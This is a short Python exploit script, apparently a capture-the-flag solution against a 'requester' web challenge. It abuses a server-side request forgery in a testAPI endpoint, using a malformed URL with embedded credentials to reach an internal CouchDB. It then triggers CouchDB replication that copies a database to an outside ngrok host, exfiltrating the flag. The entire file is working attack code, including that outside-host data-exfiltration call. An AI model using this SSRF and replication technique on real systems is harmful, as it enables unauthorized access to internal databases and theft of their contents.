import requests
import json

# Create user
# curl https://requester.mc.ax/createUser?username=nep2\&password=nep12
# curl http://localhost:8080/createUser?username=neptunian\&password=neptunian

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
}

# Simple POST Test
# params = (
#     ('url', 'http://neptunian:neptunian@couchdb:5984@couchdb:5984/neptunian'),
#     ('method', 'POST'),
#     ('data', 
#         json.dumps({
#             "some_int": 1,
#             "some_string": "c"
#         })
#     )
# )

# POST Replication
params = (
    ('url', 'http://neptunian:neptunian@couchdb:5984@couchdb:5984/_replicate'),
    ('method', 'POST'),
    ('data', 
        json.dumps({
            "source": "neptunian",
            "target": "https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag"
        })
    )
)

# Local
response = requests.get('http://localhost:8080/testAPI', headers=headers, params=params) 

# Remote
# response = requests.get('https://requester.mc.ax/testAPI', headers=headers, params=params) 

print(response.text)
